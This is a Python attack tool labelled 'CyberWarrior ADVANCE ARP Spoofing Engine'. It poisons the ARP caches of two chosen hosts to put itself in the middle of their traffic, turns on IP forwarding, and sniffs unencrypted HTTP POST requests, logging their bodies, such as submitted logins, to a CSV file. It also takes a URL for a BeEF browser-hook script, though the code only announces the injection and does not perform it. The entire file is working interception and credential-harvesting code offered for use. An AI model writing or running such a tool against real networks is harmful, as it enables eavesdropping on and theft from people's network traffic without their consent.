#!/usr/bin/env python3
import scapy.all as scapy
import time
import platform
import argparse
from colorama import Fore as mandonga, Style as utopolo
import re
import sys
from rich.console import Console
from rich.table import Table
from rich.progress import track
from datetime import datetime
import logging
import threading
import csv
import subprocess
import os
import itertools  # Added back for loading_animation

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
console = Console()

def banner():
    console.print(f"""
{mandonga.CYAN}
######################################################
#                                                    #
#                 Welcome to CyberWarrior            #
#                ADVANCE ARP Spoofing Engine         #
#                   Author: AuxGrep                  #
######################################################
{utopolo.RESET_ALL}
""")

def loading_animation(message, duration=5):
    for _ in itertools.cycle(['|', '/', '-', '\\']):
        sys.stdout.write(f'\r{message} {_}')
        sys.stdout.flush()
        time.sleep(0.1)
        duration -= 0.1
        if duration <= 0:
            break
    sys.stdout.write('\r' + ' ' * len(message) + '\r')

def check_os(supported=['Linux', 'Unix']):
    try:
        loading_animation(f'[Os-check] {mandonga.YELLOW}Checking Operating System{utopolo.RESET_ALL}')
        os_type = platform.system()
        if os_type not in supported:
            console.print(f"[bold red][ERROR]: Only run this program on {', '.join(supported)} systems![/bold red]")
            sys.exit(1)
        return os_type
    except Exception as e:
        console.print(f"[bold red][ERROR]: Failed to check OS: {e}[/bold red]")
        sys.exit(1)

def is_root():
    return os.geteuid() == 0

def get_arguments():
    parser = argparse.ArgumentParser(description="ADV ARP attack - Network")
    parser.add_argument("-t", "--targets", dest='target', help="2 targets to perform the spoof (e.g., '192.168.0.1 192.168.0.100')", nargs=2, type=str)
    parser.add_argument("-j", "--inject", dest="js_url", help="URL of the BeEF hook JS to inject")
    parser.add_argument("-o", "--output", dest="output_file", help="File to save captured POST data", default="post_data.csv")
    options = parser.parse_args()
    if not options.target or not all(ip_is_valid(ip) for ip in options.target):
        console.print("[bold yellow][X] Invalid or missing targets. Use -t or input manually.[/bold yellow]")
        ip_1 = input("[?] Enter the first IP: ")
        ip_2 = input("[?] Enter the second IP: ")
        options.target = [ip_1, ip_2]
    return options.target, options.js_url, options.output_file

def ip_is_valid(ip):
    return bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip))

def get_mac(ip):
    try:
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_broadcast_packet = broadcast_packet / arp_packet
        answered = scapy.srp(arp_broadcast_packet, timeout=5, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None
    except Exception as e:
        console.print(f"[bold red][ERROR] Failed to get MAC for {ip}: {e}[/bold red]")
        return None

def spoof(target_ip, spoof_ip, target_mac, js_url=None):
    if not target_mac:
        return
    try:
        arp_spoof_response = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=target_ip)
        scapy.send(arp_spoof_response, verbose=False)
        if js_url:
            console.print(f"[cyan][+] Spoofing {target_ip} with {spoof_ip}, JS injection ready[/cyan]")
    except Exception as e:
        console.print(f"[bold red][ERROR] Spoofing failed for {target_ip}: {e}[/bold red]")

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    if not target_mac or not spoof_mac:
        return
    try:
        arp_restore_response = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=spoof_mac, hwdst=target_mac)
        scapy.send(arp_restore_response, verbose=False, count=4)
    except Exception as e:
        console.print(f"[bold red][ERROR] Restore failed for {target_ip}: {e}[/bold red]")

def display_status(ip_1, mac_1, ip_2, mac_2, sent_packets_count):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    console.print(f"{current_time} - Attacking: {ip_1} ({mac_1}) <-> {ip_2} ({mac_2}) {sent_packets_count} packets sent")

def post_data_sniffer(packet, table, output_file):
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80:
        try:
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            if 'POST' in payload[:100]:  # Check only first 100 bytes to avoid false positives
                lines = payload.split('\r\n')
                headers = [line for line in lines if ': ' in line]
                body = lines[-1] if lines[-1] else ''
                timestamp = str(datetime.now())
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                header = headers[0] if headers else 'No headers'
                body_preview = body[:200]

                table.add_row(timestamp, src_ip, dst_ip, header, body_preview)
                console.print(table)

                with open(output_file, 'a', newline='') as csvfile:
                    csvwriter = csv.writer(csvfile)
                    csvwriter.writerow([timestamp, src_ip, dst_ip, header, body_preview])
        except Exception as e:
            console.print(f"[bold red][ERROR] Sniffer error: {e}[/bold red]")

def start_post_sniffer(output_file):
    with open(output_file, 'w', newline='') as csvfile:
        csvwriter = csv.writer(csvfile)
        csvwriter.writerow(["Timestamp", "Source IP", "Destination IP", "Header", "Body"])

    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Timestamp", style="dim")
    table.add_column("Source IP")
    table.add_column("Destination IP")
    table.add_column("Header")
    table.add_column("Body")

    scapy.sniff(filter="tcp port 80", prn=lambda pkt: post_data_sniffer(pkt, table, output_file), store=False)

def arp_spoofing(ip_1, ip_2, mac_1, mac_2, js_url):
    sent_packets_counter = 0
    try:
        while True:
            spoof(ip_1, ip_2, mac_1, js_url)
            spoof(ip_2, ip_1, mac_2, js_url)
            sent_packets_counter += 2
            if sent_packets_counter % 2 == 0:
                display_status(ip_1, mac_1, ip_2, mac_2, sent_packets_counter)
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[bold yellow][+] Restoring ARP tables...[/bold yellow]")
        restore(ip_1, ip_2, mac_1, get_mac(ip_2))  # Use get_mac to get spoof_mac if needed
        restore(ip_2, ip_1, mac_2, get_mac(ip_1))
        console.print("[bold green][+] Exiting...[/bold green]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red][X] Error: {e}[/bold red]")
        restore(ip_1, ip_2, mac_1, get_mac(ip_2))
        restore(ip_2, ip_1, mac_2, get_mac(ip_1))
        sys.exit(1)

if __name__ == "__main__":
    banner()
    check_os()
    if not is_root():
        loading_animation(f'[Root-check] {mandonga.YELLOW}Checking if we are root{utopolo.RESET_ALL}')
        console.print("[bold red][!] Please run the script as root[/bold red]")
        sys.exit(1)

    # Enable IP forwarding safely
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        loading_animation(f"[INFO]{mandonga.YELLOW} IP forwarding enabled{utopolo.RESET_ALL}")
    except Exception as e:
        console.print(f"[bold red][ERROR] Failed to enable IP forwarding: {e}[/bold red]")
        sys.exit(1)

    targets, js_url, output_file = get_arguments()
    ip_1, ip_2 = targets

    if not (ip_is_valid(ip_1) and ip_is_valid(ip_2)):
        console.print("[bold red][!] IPs are not valid, Exiting...[/bold red]")
        sys.exit(1)

    mac_1 = get_mac(ip_1)
    mac_2 = get_mac(ip_2)
    if not mac_1 or not mac_2:
        loading_animation(f'{mandonga.RED}Failed to get MAC addresses for targets! Exiting{utopolo.RESET_ALL}')
        console.print("[bold red][!] Failed to get MAC addresses, Exiting...[/bold red]")
        sys.exit(1)

    # Start sniffing in a separate thread
    sniffer_thread = threading.Thread(target=start_post_sniffer, args=(output_file,), daemon=True)
    sniffer_thread.start()

    # Start ARP spoofing
    arp_spoofing(ip_1, ip_2, mac_1, mac_2, js_url)
